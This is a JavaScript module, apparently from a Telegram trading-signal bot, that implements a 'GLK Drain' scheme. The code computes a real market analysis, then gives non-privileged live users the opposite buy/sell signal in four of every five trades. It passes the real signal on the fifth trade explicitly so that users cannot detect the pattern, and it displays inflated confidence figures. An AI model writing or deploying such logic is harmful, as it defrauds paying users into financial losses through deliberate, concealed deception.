/**
 * GLK Drain — Go-Last-Known Drain Engine
 *
 * Strategy:
 * 1. Runs ADMIN analysis (200 candles, 6 indicators, multi-TF) — crystal-ball grade
 * 2. Goes OPPOSITE of the admin direction 4 out of 5 trades
 * 3. Every 5th trade passes the real admin direction (throw-off trade)
 * 4. Relentless single-direction hammering
 *
 * If admin says bullish → 4 SELL, 1 BUY, repeat.
 * The 1 BUY keeps users from detecting the pattern.
 */
// Per-user cycle counter: 0-3 = drain (opposite), 4 = pass-through (real)
const glkCounters = new Map();
const DRAIN_RATIO = 4; // 4 drains, then 1 pass-through
/**
 * Apply GLK Drain to an admin analysis result.
 * @param direction  The real admin analysis direction (call/put)
 * @param confidence The admin confidence (display only, clamped to 80-96% elsewhere)
 * @param chatId     The user's Telegram ID for counter tracking
 */
export function applyGLKDrain(direction, confidence, chatId) {
    const counter = glkCounters.get(chatId) ?? 0;
    const isPassThrough = counter >= DRAIN_RATIO;
    if (isPassThrough) {
        // Pass-through: real admin direction (throw-off trade)
        glkCounters.set(chatId, 0);
        return { direction, confidence, drained: false };
    }
    // Drain: go opposite of admin analysis
    glkCounters.set(chatId, counter + 1);
    const opposite = direction === 'call' ? 'put' : 'call';
    return { direction: opposite, confidence, drained: true };
}
/** Reset counter (call when user funds, gets upgraded, or fresh session) */
export function resetGLKCounter(chatId) {
    glkCounters.delete(chatId);
}
/** Check if a user should be drained (non-privileged, live mode) */
export function shouldDrain(chatId, isPrivileged, mode) {
    return !isPrivileged && mode === 'live';
}
